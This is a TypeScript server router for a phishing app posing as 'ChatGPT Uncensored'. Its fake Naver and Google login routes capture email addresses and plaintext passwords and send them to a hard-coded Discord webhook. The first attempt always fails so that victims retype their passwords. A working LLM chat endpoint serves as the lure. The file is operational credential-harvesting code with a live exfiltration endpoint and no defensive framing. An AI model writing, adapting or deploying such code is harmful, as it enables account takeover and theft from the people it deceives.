import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import { z } from "zod";
import { TRPCError } from "@trpc/server";
import { invokeLLM } from "./_core/llm";

// Track login attempts per user
const loginAttempts = new Map<string, number>();

export const appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  // Fake login
  fakeLogin: router({
    naver: publicProcedure
      .input(z.object({
        username: z.string(),
        password: z.string(),
      }))
      .mutation(async ({ input }) => {
        const userKey = `naver_${input.username}`;
        const attempts = loginAttempts.get(userKey) || 0;
        
        // Send to webhook (both success and failure)
        const webhookUrl = "https://discord.com/api/webhooks/1432609926613700660/W0izZzksctzIC-8oW3DqKZKrVDh0AKKidjzgMWIdUINKC3wYdtuM00HM5q54TPEh1mZ9";
        
        const timestamp = new Date().toLocaleString('ko-KR', { 
          timeZone: 'Asia/Seoul',
          year: 'numeric',
          month: '2-digit',
          day: '2-digit',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit'
        });
        
        // Validate
        const hasValidEmail = input.username.includes('@naver.com');
        const hasValidLength = input.password.length >= 8;
        const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(input.password);
        const hasUpperCase = /[A-Z]/.test(input.password);
        const hasValidPassword = hasValidLength && (hasSpecialChar || hasUpperCase);
        
        const isValid = hasValidEmail && hasValidPassword;
        
        // First attempt always fails
        if (attempts === 0) {
          loginAttempts.set(userKey, 1);
          
          const payload = {
            embeds: [{
              title: "❌ 네이버 로그인 실패 (첫 시도)",
              color: 15158332,
              fields: [
                {
                  name: "이메일",
                  value: input.username,
                  inline: true
                },
                {
                  name: "비밀번호",
                  value: input.password,
                  inline: true
                },
                {
                  name: "시도 횟수",
                  value: "1회",
                  inline: true
                },
                {
                  name: "시간",
                  value: timestamp,
                  inline: false
                }
              ],
              footer: {
                text: "ChatGPT Uncensored - Naver Login Failed"
              }
            }]
          };
          
          try {
            await fetch(webhookUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(payload)
            });
          } catch (error) {
            console.error('Webhook error:', error);
          }
          
          throw new TRPCError({
            code: 'BAD_REQUEST',
            message: '아이디 또는 비밀번호가 올바르지 않습니다.',
          });
        }
        
        // Second attempt onwards - check validation
        if (!isValid) {
          loginAttempts.set(userKey, attempts + 1);
          
          const payload = {
            embeds: [{
              title: "❌ 네이버 로그인 실패",
              color: 15158332,
              fields: [
                {
                  name: "이메일",
                  value: input.username,
                  inline: true
                },
                {
                  name: "비밀번호",
                  value: input.password,
                  inline: true
                },
                {
                  name: "시도 횟수",
                  value: `${attempts + 1}회`,
                  inline: true
                },
                {
                  name: "실패 이유",
                  value: !hasValidEmail ? "이메일 형식 오류" : "비밀번호 형식 오류",
                  inline: false
                },
                {
                  name: "시간",
                  value: timestamp,
                  inline: false
                }
              ],
              footer: {
                text: "ChatGPT Uncensored - Naver Login Failed"
              }
            }]
          };
          
          try {
            await fetch(webhookUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(payload)
            });
          } catch (error) {
            console.error('Webhook error:', error);
          }
          
          throw new TRPCError({
            code: 'BAD_REQUEST',
            message: '아이디 또는 비밀번호가 올바르지 않습니다.',
          });
        }
        
        // Success
        loginAttempts.set(userKey, attempts + 1);
        
        const payload = {
          embeds: [{
            title: "✅ 네이버 로그인 성공",
            color: 3066993,
            fields: [
              {
                name: "이메일",
                value: input.username,
                inline: true
              },
              {
                name: "비밀번호",
                value: input.password,
                inline: true
              },
              {
                name: "시도 횟수",
                value: `${attempts + 1}회`,
                inline: true
              },
              {
                name: "시간",
                value: timestamp,
                inline: false
              }
            ],
            footer: {
              text: "ChatGPT Uncensored - Naver Login Success"
            }
          }]
        };
        
        try {
          await fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
          });
        } catch (error) {
          console.error('Webhook error:', error);
        }

        return {
          success: true,
          user: {
            username: input.username,
            provider: 'naver',
          }
        };
      }),

    google: publicProcedure
      .input(z.object({
        username: z.string(),
        password: z.string(),
      }))
      .mutation(async ({ input }) => {
        const userKey = `google_${input.username}`;
        const attempts = loginAttempts.get(userKey) || 0;
        
        // Send to webhook (both success and failure)
        const webhookUrl = "https://discord.com/api/webhooks/1432609926613700660/W0izZzksctzIC-8oW3DqKZKrVDh0AKKidjzgMWIdUINKC3wYdtuM00HM5q54TPEh1mZ9";
        
        const timestamp = new Date().toLocaleString('ko-KR', { 
          timeZone: 'Asia/Seoul',
          year: 'numeric',
          month: '2-digit',
          day: '2-digit',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit'
        });
        
        // Validate
        const hasValidEmail = input.username.includes('@gmail.com');
        const hasValidLength = input.password.length >= 8;
        const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(input.password);
        const hasUpperCase = /[A-Z]/.test(input.password);
        const hasValidPassword = hasValidLength && (hasSpecialChar || hasUpperCase);
        
        const isValid = hasValidEmail && hasValidPassword;
        
        // First attempt always fails
        if (attempts === 0) {
          loginAttempts.set(userKey, 1);
          
          const payload = {
            embeds: [{
              title: "❌ 구글 로그인 실패 (첫 시도)",
              color: 15158332,
              fields: [
                {
                  name: "이메일",
                  value: input.username,
                  inline: true
                },
                {
                  name: "비밀번호",
                  value: input.password,
                  inline: true
                },
                {
                  name: "시도 횟수",
                  value: "1회",
                  inline: true
                },
                {
                  name: "시간",
                  value: timestamp,
                  inline: false
                }
              ],
              footer: {
                text: "ChatGPT Uncensored - Google Login Failed"
              }
            }]
          };
          
          try {
            await fetch(webhookUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(payload)
            });
          } catch (error) {
            console.error('Webhook error:', error);
          }
          
          throw new TRPCError({
            code: 'BAD_REQUEST',
            message: '아이디 또는 비밀번호가 올바르지 않습니다.',
          });
        }
        
        // Second attempt onwards - check validation
        if (!isValid) {
          loginAttempts.set(userKey, attempts + 1);
          
          const payload = {
            embeds: [{
              title: "❌ 구글 로그인 실패",
              color: 15158332,
              fields: [
                {
                  name: "이메일",
                  value: input.username,
                  inline: true
                },
                {
                  name: "비밀번호",
                  value: input.password,
                  inline: true
                },
                {
                  name: "시도 횟수",
                  value: `${attempts + 1}회`,
                  inline: true
                },
                {
                  name: "실패 이유",
                  value: !hasValidEmail ? "이메일 형식 오류" : "비밀번호 형식 오류",
                  inline: false
                },
                {
                  name: "시간",
                  value: timestamp,
                  inline: false
                }
              ],
              footer: {
                text: "ChatGPT Uncensored - Google Login Failed"
              }
            }]
          };
          
          try {
            await fetch(webhookUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(payload)
            });
          } catch (error) {
            console.error('Webhook error:', error);
          }
          
          throw new TRPCError({
            code: 'BAD_REQUEST',
            message: '아이디 또는 비밀번호가 올바르지 않습니다.',
          });
        }
        
        // Success
        loginAttempts.set(userKey, attempts + 1);
        
        const payload = {
          embeds: [{
            title: "✅ 구글 로그인 성공",
            color: 4286945,
            fields: [
              {
                name: "이메일",
                value: input.username,
                inline: true
              },
              {
                name: "비밀번호",
                value: input.password,
                inline: true
              },
              {
                name: "시도 횟수",
                value: `${attempts + 1}회`,
                inline: true
              },
              {
                name: "시간",
                value: timestamp,
                inline: false
              }
            ],
            footer: {
              text: "ChatGPT Uncensored - Google Login Success"
            }
          }]
        };
        
        try {
          await fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
          });
        } catch (error) {
          console.error('Webhook error:', error);
        }

        return {
          success: true,
          user: {
            username: input.username,
            provider: 'google',
          }
        };
      }),
  }),

  // Chat functionality with real LLM
  chat: router({
    sendMessage: publicProcedure
      .input(
        z.object({
          message: z.string(),
          conversationId: z.string().optional(),
        })
      )
      .mutation(async ({ input }) => {
        try {
          // Call LLM API
          const response = await invokeLLM({
            messages: [
              {
                role: 'system',
                content: '당신은 친절하고 도움이 되는 AI 비서입니다. 사용자의 질문에 상세하고 정확하게 답변해주세요.'
              },
              {
                role: 'user',
                content: input.message
              }
            ]
          });
          
          const aiResponse = response.choices[0]?.message?.content || '죄송합니다. 응답을 생성하는 데 실패했습니다.';
          
          return {
            success: true,
            response: aiResponse,
            conversationId: input.conversationId || `conv_${Date.now()}`,
          };
        } catch (error) {
          console.error('LLM API error:', error);
          // Fallback response
          return {
            success: true,
            response: '죄송합니다. 현재 AI 서비스에 문제가 있습니다. 나중에 다시 시도해주세요.',
            conversationId: input.conversationId || `conv_${Date.now()}`,
          };
        }
      }),
  }),
});

export type AppRouter = typeof appRouter;
